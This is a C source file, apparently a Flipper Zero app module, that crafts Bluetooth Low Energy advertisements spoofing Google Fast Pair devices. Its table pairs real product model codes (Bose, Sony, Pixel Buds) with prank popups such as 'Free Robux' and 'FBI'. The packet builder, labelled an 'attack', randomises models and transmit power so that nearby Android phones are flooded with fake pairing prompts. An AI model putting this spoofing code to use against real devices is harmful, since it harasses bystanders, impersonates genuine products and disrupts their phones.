#include "fastpair.h"
#include "_protocols.h"

// Hacked together by @Willy-JL and @Spooks4576
// Documentation at https://developers.google.com/nearby/fast-pair/specifications/introduction

const struct {
    uint32_t value;
    const char* name;
} models[] = {
    // Genuine actions
    {0x00000C, "Set Up Device"},

    // Genuine devices
    {0x00000a, "Anti-Spoofing Test (lmao)"},
    {0x0001F0, "Bisto CSR8670 Dev Board"},
    {0x000047, "Arduino 101"},
    {0xCD8256, "Bose NC 700"},
    {0xF52494, "JBL Buds Pro"},
    {0x718FA4, "JBL Live 300TWS"},
    {0x821F66, "JBL Flip 6"},
    {0x92BBBD, "Pixel Buds"},
    {0x000006, "Google Pixel buds"},
    {0xD446A7, "Sony XM5"},
    {0x2D7A23, "Sony WF-1000XM4"},
    {0x0E30C3, "Razer Hammerhead TWS"},
    {0x72EF8D, "Razer Hammerhead TWS X"},
    {0x72FB00, "Soundcore Spirit Pro GVA"},

    // Custom debug popups
    {0xD99CA1, "Flipper Zero"},
    {0x77FF67, "Free Robux"},
    {0xAA187F, "Free VBucks"},
    {0xDCE9EA, "Rickroll"},
    {0x87B25F, "Animated Rickroll"},
    {0xF38C02, "Boykisser"},
    {0x1448C9, "BLM"},
    {0xD5AB33, "Xtreme"},
    {0x0C0B67, "Xtreme Cta"},
    {0x13B39D, "Talking Sasquach"},
    {0xAA1FE1, "ClownMaster"},
    {0x7C6CDB, "Obama"},
    {0x005EF9, "Ryanair"},
    {0xE2106F, "FBI"},
    {0xB37A62, "Tesla"},
};
const uint8_t models_count = COUNT_OF(models);

static const char* fastpair_get_name(const ProtocolCfg* _cfg) {
    UNUSED(_cfg);
    return "FastPair";
}

static void fastpair_make_packet(uint8_t* _size, uint8_t** _packet, const ProtocolCfg* _cfg) {
    const FastpairCfg* cfg = _cfg ? &_cfg->fastpair : NULL;

    uint32_t model;
    if(cfg && cfg->model != 0x000000) {
        model = cfg->model;
    } else {
        model = models[rand() % models_count].value;
    }

    uint8_t size = 14;
    uint8_t* packet = malloc(size);
    uint8_t i = 0;

    packet[i++] = 3; // Size
    packet[i++] = 0x03; // AD Type (Service UUID List)
    packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
    packet[i++] = 0xFE; // ...

    packet[i++] = 6; // Size
    packet[i++] = 0x16; // AD Type (Service Data)
    packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
    packet[i++] = 0xFE; // ...
    packet[i++] = (model >> 0x10) & 0xFF;
    packet[i++] = (model >> 0x08) & 0xFF;
    packet[i++] = (model >> 0x00) & 0xFF;

    packet[i++] = 2; // Size
    packet[i++] = 0x0A; // AD Type (Tx Power Level)
    packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm

    *_size = size;
    *_packet = packet;
}

enum {
    _ConfigExtraStart = ConfigExtraStart,
    ConfigModel,
    ConfigInfoRequire,
    ConfigCOUNT,
};
static void config_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    scene_manager_set_scene_state(ctx->scene_manager, SceneConfig, index);
    switch(index) {
    case ConfigModel:
        scene_manager_next_scene(ctx->scene_manager, SceneFastpairModel);
        break;
    case ConfigInfoRequire:
        break;
    default:
        ctx->fallback_config_enter(ctx, index);
        break;
    }
}
static void model_changed(VariableItem* item) {
    FastpairCfg* cfg = variable_item_get_context(item);
    uint8_t index = variable_item_get_current_value_index(item);
    if(index) {
        index--;
        cfg->model = models[index].value;
        variable_item_set_current_value_text(item, models[index].name);
    } else {
        cfg->model = 0x000000;
        variable_item_set_current_value_text(item, "Random");
    }
}
static void fastpair_extra_config(Ctx* ctx) {
    FastpairCfg* cfg = &ctx->attack->payload.cfg.fastpair;
    VariableItemList* list = ctx->variable_item_list;
    VariableItem* item;
    size_t value_index;

    item = variable_item_list_add(list, "Model Code", models_count + 1, model_changed, cfg);
    const char* model_name = NULL;
    char model_name_buf[9];
    if(cfg->model == 0x000000) {
        model_name = "Random";
        value_index = 0;
    } else {
        for(uint8_t i = 0; i < models_count; i++) {
            if(cfg->model == models[i].value) {
                model_name = models[i].name;
                value_index = i + 1;
                break;
            }
        }
        if(!model_name) {
            snprintf(model_name_buf, sizeof(model_name_buf), "%06lX", cfg->model);
            model_name = model_name_buf;
            value_index = models_count + 1;
        }
    }
    variable_item_set_current_value_index(item, value_index);
    variable_item_set_current_value_text(item, model_name);

    variable_item_list_add(list, "Requires Google services", 0, NULL, NULL);

    variable_item_list_set_enter_callback(list, config_callback, ctx);
}

static uint8_t fastpair_config_count(const ProtocolCfg* _cfg) {
    UNUSED(_cfg);
    return ConfigCOUNT - ConfigExtraStart - 1;
}

const Protocol protocol_fastpair = {
    .icon = &I_android,
    .get_name = fastpair_get_name,
    .make_packet = fastpair_make_packet,
    .extra_config = fastpair_extra_config,
    .config_count = fastpair_config_count,
};

static void model_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    FastpairCfg* cfg = &ctx->attack->payload.cfg.fastpair;
    switch(index) {
    case 0:
        cfg->model = 0x000000;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    case models_count + 1:
        scene_manager_next_scene(ctx->scene_manager, SceneFastpairModelCustom);
        break;
    default:
        cfg->model = models[index - 1].value;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    }
}
void scene_fastpair_model_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    FastpairCfg* cfg = &ctx->attack->payload.cfg.fastpair;
    Submenu* submenu = ctx->submenu;
    uint32_t selected = 0;
    bool found = false;
    submenu_reset(submenu);

    submenu_add_item(submenu, "Random", 0, model_callback, ctx);
    if(cfg->model == 0x000000) {
        found = true;
        selected = 0;
    }
    for(uint8_t i = 0; i < models_count; i++) {
        submenu_add_item(submenu, models[i].name, i + 1, model_callback, ctx);
        if(!found && cfg->model == models[i].value) {
            found = true;
            selected = i + 1;
        }
    }
    submenu_add_item(submenu, "Custom", models_count + 1, model_callback, ctx);
    if(!found) {
        found = true;
        selected = models_count + 1;
    }

    submenu_set_selected_item(submenu, selected);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewSubmenu);
}
bool scene_fastpair_model_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_fastpair_model_on_exit(void* _ctx) {
    UNUSED(_ctx);
}

static void model_custom_callback(void* _ctx) {
    Ctx* ctx = _ctx;
    scene_manager_previous_scene(ctx->scene_manager);
    scene_manager_previous_scene(ctx->scene_manager);
}
void scene_fastpair_model_custom_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    FastpairCfg* cfg = &ctx->attack->payload.cfg.fastpair;
    ByteInput* byte_input = ctx->byte_input;

    byte_input_set_header_text(byte_input, "Enter custom Model Code");

    ctx->byte_store[0] = (cfg->model >> 0x10) & 0xFF;
    ctx->byte_store[1] = (cfg->model >> 0x08) & 0xFF;
    ctx->byte_store[2] = (cfg->model >> 0x00) & 0xFF;

    byte_input_set_result_callback(
        byte_input, model_custom_callback, NULL, ctx, (void*)ctx->byte_store, 3);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewByteInput);
}
bool scene_fastpair_model_custom_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_fastpair_model_custom_on_exit(void* _ctx) {
    Ctx* ctx = _ctx;
    FastpairCfg* cfg = &ctx->attack->payload.cfg.fastpair;
    cfg->model =
        (ctx->byte_store[0] << 0x10) + (ctx->byte_store[1] << 0x08) + (ctx->byte_store[2] << 0x00);
}
